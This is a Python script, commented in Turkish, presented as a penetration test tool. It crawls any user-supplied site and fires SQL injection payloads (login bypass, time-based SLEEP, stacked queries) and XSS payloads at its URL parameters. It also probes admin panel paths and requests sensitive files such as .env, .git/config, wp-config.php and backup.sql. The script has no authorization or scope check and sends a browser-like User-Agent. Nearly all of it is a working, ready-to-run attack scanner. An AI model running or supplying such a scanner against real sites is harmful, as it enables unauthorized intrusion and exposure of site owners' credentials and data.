#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PENETRATION TEST TOOL - Kali Linux & Termux Uyumlu
Hedef siteye sızma testi yapar
"""

import requests
import time
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from datetime import datetime

# =========== RENK KODLARI ===========
class Renk:
    KIRMIZI = '\033[91m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    MAVI = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def print_banner():
    print(f"""
{Renk.KIRMIZI}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗  ║
║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝  ║
║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║     ║
║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║     ║
║     ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║     ║
║     ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝     ║
║                                                                   ║
║              PENETRATION TEST TOOL v2.0                           ║
║         Kali Linux & Termux Uyumlu - Otomatik Test               ║
╚═══════════════════════════════════════════════════════════════════╝
{Renk.RESET}
    """)

class PenetrationTest:
    def __init__(self, hedef):
        self.hedef = hedef.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Connection': 'keep-alive'
        })
        self.bulunan_zafiyetler = []
        self.bulunan_linkler = set()
        
        # SQL Payloadlar
        self.sql_payloads = [
            ("'", "Tek tırnak hatasi"),
            ('"', "Cift tırnak hatasi"),
            ("' OR '1'='1", "Authentication Bypass"),
            ("' OR 1=1--", "Boolean SQL Injection"),
            ("1' AND 1=1--", "Boolean Test 1"),
            ("1' AND 1=2--", "Boolean Test 2"),
            ("' AND SLEEP(5)--", "Time-Based SQL"),
            ("'; SELECT * FROM users--", "Union SQL"),
            ("admin' --", "Login Bypass")
        ]
        
        # XSS Payloadlar
        self.xss_payloads = [
            ("<script>alert('XSS')</script>", "Basic XSS"),
            ("<img src=x onerror=alert(1)>", "Image XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("javascript:alert('XSS')", "JavaScript XSS")
        ]
        
        # Admin panel yollari
        self.admin_panels = [
            "/admin", "/login", "/wp-admin", "/administrator", "/panel",
            "/yonetim", "/adminpanel", "/dashboard", "/admin.php",
            "/login.php", "/giris"
        ]
        
        # Hassas dosyalar
        self.hassas_dosyalar = [
            "/robots.txt", "/sitemap.xml", "/.git/config", "/.env",
            "/config.php", "/wp-config.php", "/phpinfo.php", "/backup.sql"
        ]
    
    def log(self, mesaj, seviye="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if seviye == "BULUNDU":
            print(f"{Renk.YESIL}[{timestamp}] [+] {mesaj}{Renk.RESET}")
        elif seviye == "ZAFIYET":
            print(f"{Renk.KIRMIZI}[{timestamp}] [!!!] {mesaj}{Renk.RESET}")
        elif seviye == "HATA":
            print(f"{Renk.KIRMIZI}[{timestamp}] [X] {mesaj}{Renk.RESET}")
        elif seviye == "INFO":
            print(f"{Renk.MAVI}[{timestamp}] [*] {mesaj}{Renk.RESET}")
    
    def site_kontrol(self):
        """Hedef siteye erişimi kontrol eder"""
        try:
            resp = self.session.get(self.hedef, timeout=5)
            if resp.status_code == 200:
                self.log(f"Siteye erisildi: {self.hedef} (HTTP {resp.status_code})", "BULUNDU")
                return True
            else:
                self.log(f"Siteye erisilemiyor! HTTP {resp.status_code}", "HATA")
                return False
        except:
            self.log("Baglanti hatasi! Siteye erisilemiyor.", "HATA")
            return False
    
    def linkleri_topla(self):
        """Hedef sitedeki linkleri toplar"""
        self.log("Linkler toplaniyor...", "INFO")
        kuyruk = [self.hedef]
        ziyaret = set()
        
        while kuyruk and len(self.bulunan_linkler) < 200:
            url = kuyruk.pop(0)
            if url in ziyaret:
                continue
            
            ziyaret.add(url)
            
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    hrefs = re.findall(r'href=[\'"]?([^\'" >]+)', resp.text)
                    
                    for link in hrefs:
                        if link.startswith('http'):
                            if self.hedef in link:
                                self.bulunan_linkler.add(link)
                        elif link.startswith('/'):
                            self.bulunan_linkler.add(self.hedef + link)
                        elif link.startswith('?'):
                            self.bulunan_linkler.add(self.hedef + link)
                        elif not link.startswith('#') and 'mailto:' not in link and link:
                            self.bulunan_linkler.add(urljoin(url, link))
                    
                    for link in list(self.bulunan_linkler - ziyaret)[:15]:
                        if link not in kuyruk:
                            kuyruk.append(link)
                    
                    sys.stdout.write(f"\r[*] Bulunan link: {len(self.bulunan_linkler)}")
                    sys.stdout.flush()
            except:
                continue
        
        print()
        self.log(f"{len(self.bulunan_linkler)} link bulundu.", "BULUNDU")
    
    def sql_testi(self):
        """SQL enjeksiyon testi yapar"""
        self.log("SQL Enjeksiyon testi basliyor...", "INFO")
        
        parametreli_linkler = []
        for link in self.bulunan_linkler:
            if '?' in link and '=' in link:
                parsed = urlparse(link)
                params = parse_qs(parsed.query)
                for param in params.keys():
                    parametreli_linkler.append((link, param))
        
        if not parametreli_linkler:
            self.log("Parametreli link bulunamadi!", "HATA")
            return
        
        self.log(f"{len(parametreli_linkler)} parametre test ediliyor...", "INFO")
        
        for link, param in parametreli_linkler[:40]:
            for payload, desc in self.sql_payloads:
                try:
                    parsed = urlparse(link)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    baslangic = time.time()
                    resp = self.session.get(test_url, timeout=8)
                    gecen = time.time() - baslangic
                    
                    sayfa = resp.text.lower()
                    hata_bulundu = False
                    
                    sql_hatalari = ["sql syntax", "mysql", "database error", "unclosed quotation",
                                   "you have an error", "warning", "division by zero", "ora-"]
                    
                    for hata in sql_hatalari:
                        if hata in sayfa:
                            hata_bulundu = True
                            break
                    
                    if "sleep" in payload.lower() and gecen >= 4:
                        hata_bulundu = True
                    
                    if hata_bulundu:
                        sonuc = {
                            'tip': 'SQL Injection',
                            'link': test_url,
                            'parametre': param,
                            'payload': payload,
                            'aciklama': desc
                        }
                        self.bulunan_zafiyetler.append(sonuc)
                        self.log(f"SQL Injection! -> {test_url[:80]}...", "ZAFIYET")
                        break
                except:
                    continue
    
    def xss_testi(self):
        """XSS testi yapar"""
        self.log("XSS testi basliyor...", "INFO")
        
        parametreli_linkler = []
        for link in self.bulunan_linkler:
            if '?' in link and '=' in link:
                parsed = urlparse(link)
                params = parse_qs(parsed.query)
                for param in params.keys():
                    parametreli_linkler.append((link, param))
        
        for link, param in parametreli_linkler[:30]:
            for payload, desc in self.xss_payloads:
                try:
                    parsed = urlparse(link)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    resp = self.session.get(test_url, timeout=5)
                    
                    if payload.replace('"', '&quot;') in resp.text or payload in resp.text:
                        sonuc = {
                            'tip': 'XSS',
                            'link': test_url,
                            'parametre': param,
                            'payload': payload,
                            'aciklama': desc
                        }
                        self.bulunan_zafiyetler.append(sonuc)
                        self.log(f"XSS bulundu! -> {test_url[:80]}...", "ZAFIYET")
                        break
                except:
                    continue
    
    def admin_panel_bul(self):
        """Admin paneli arar"""
        self.log("Admin paneli araniyor...", "INFO")
        
        for panel in self.admin_panels:
            test_url = self.hedef + panel
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    sonuc = {
                        'tip': 'Admin Panel',
                        'link': test_url,
                        'parametre': '-',
                        'payload': '-',
                        'aciklama': 'Bulunan admin paneli'
                    }
                    self.bulunan_zafiyetler.append(sonuc)
                    self.log(f"Admin panel: {test_url}", "ZAFIYET")
            except:
                continue
    
    def bilgi_sizdirma_test(self):
        """Bilgi sızdırma testi yapar"""
        self.log("Bilgi sizdirma testi yapiliyor...", "INFO")
        
        for dosya in self.hassas_dosyalar:
            test_url = self.hedef + dosya
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    sonuc = {
                        'tip': 'Bilgi Sizdirma',
                        'link': test_url,
                        'parametre': '-',
                        'payload': '-',
                        'aciklama': f'Hassas dosya: {dosya}'
                    }
                    self.bulunan_zafiyetler.append(sonuc)
                    self.log(f"Hassas dosya: {test_url}", "ZAFIYET")
            except:
                continue
    
    def rapor_kaydet(self):
        """Test sonuçlarını raporlar"""
        rapor_adi = f"rapor_{int(time.time())}.txt"
        
        with open(rapor_adi, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("PENETRASYON TEST RAPORU\n")
            f.write(f"Hedef: {self.hedef}\n")
            f.write(f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            if self.bulunan_zafiyetler:
                f.write(f"Toplam Zafiyet: {len(self.bulunan_zafiyetler)}\n\n")
                
                for i, z in enumerate(self.bulunan_zafiyetler, 1):
                    f.write(f"{i}. {z['tip']}\n")
                    f.write(f"   Link: {z['link']}\n")
                    f.write(f"   Parametre: {z['parametre']}\n")
                    f.write(f"   Payload: {z['payload']}\n")
                    f.write("-" * 80 + "\n\n")
            else:
                f.write("Zafiyet bulunamadi.\n")
        
        self.log(f"Rapor kaydedildi: {rapor_adi}", "BULUNDU")
    
    def sonuclari_goster(self):
        """Test sonuçlarını ekranda gösterir"""
        print("\n" + "=" * 80)
        print(f"{Renk.CYAN}TEST SONUCLARI{Renk.RESET}")
        print("=" * 80)
        
        if self.bulunan_zafiyetler:
            print(f"\n{Renk.YESIL}Toplam {len(self.bulunan_zafiyetler)} zafiyet bulundu:{Renk.RESET}\n")
            
            for i, z in enumerate(self.bulunan_zafiyetler, 1):
                print(f"{i}. {Renk.KIRMIZI}{z['tip']}{Renk.RESET}")
                print(f"   Link: {z['link'][:100]}")
                if z['parametre'] != '-':
                    print(f"   Parametre: {z['parametre']}")
                print()
        else:
            print(f"\n{Renk.YESIL}Zafiyet bulunamadi!{Renk.RESET}")
    
    def calistir(self):
        """Tüm testleri çalıştırır"""
        print_banner()
        
        self.log(f"Hedef: {self.hedef}", "INFO")
        
        if not self.site_kontrol():
            return
        
        self.linkleri_topla()
        self.sql_testi()
        self.xss_testi()
        self.admin_panel_bul()
        self.bilgi_sizdirma_test()
        
        self.sonuclari_goster()
        self.rapor_kaydet()
        
        print(f"\n{Renk.YESIL}[+] Test tamamlandi!{Renk.RESET}")

def main():
    if len(sys.argv) > 1:
        hedef = sys.argv[1]
    else:
        hedef = input(f"{Renk.CYAN}[?] Hedef site URL: {Renk.RESET}").strip()
    
    if not hedef:
        print(f"{Renk.KIRMIZI}[X] Hedef URL girmediniz!{Renk.RESET}")
        return
    
    if not hedef.startswith("http"):
        hedef = "http://" + hedef
    
    test = PenetrationTest(hedef)
    test.calistir()

if __name__ == "__main__":
    main()
